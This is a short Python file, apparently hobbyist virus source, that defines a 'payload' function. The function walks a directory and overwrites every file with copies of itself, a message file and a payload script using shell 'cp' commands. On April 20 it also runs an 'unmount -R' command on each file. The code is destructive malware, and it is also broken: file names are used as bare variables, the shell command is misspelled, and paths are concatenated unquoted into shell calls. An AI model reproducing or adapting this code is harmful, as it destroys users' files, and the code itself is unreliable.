import os
from datetime import datetime

def payload(virusname, directory):
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            # Replicate
            os.system("cp " + virusname + " " + os.path.join(subdir, file))
            os.system("cp " + message.txt + " " + os.path.join(subdir, file))
            os.system("cp " + payload.py + " " + os.path.join(subdir, file))
            # Main payload
            if (datetime.today().month == 4 and datetime.today().day == 20):
                os.system("unmount -R " + os.path.join(subdir, file))
